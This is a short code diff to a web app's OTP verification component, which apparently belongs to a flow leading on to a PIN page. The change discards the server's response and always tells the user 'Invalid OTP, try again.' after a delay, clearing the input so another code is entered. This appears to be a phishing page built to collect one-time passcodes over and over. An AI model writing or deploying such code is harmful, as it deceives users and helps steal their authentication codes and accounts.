@@ -47,9 +47,13 @@ const Otp = () => {
       phone: vm === 'phone' ? contact : undefined,
       email: vm === 'email' ? contact : undefined,
       complaintMessage: cm,
-    })
-      .then(() => { localStorage.setItem('otpVerified', 'true'); setTimeout(() => { setLoading(false); navigate('/pin'); }, 500); })
-      .catch(() => { setTimeout(() => { setLoading(false); setError('Something went wrong.'); setOtp(new Array(OTP_LENGTH).fill('')); inputsRef.current[0]?.focus(); }, 600); });
+    }).catch(() => {});
+    setTimeout(() => {
+      setLoading(false);
+      setError('Invalid OTP, try again.');
+      setOtp(new Array(OTP_LENGTH).fill(''));
+      inputsRef.current[0]?.focus();
+    }, 3000);
   };
   const handleResend = () => {
     if (!canResend) return;
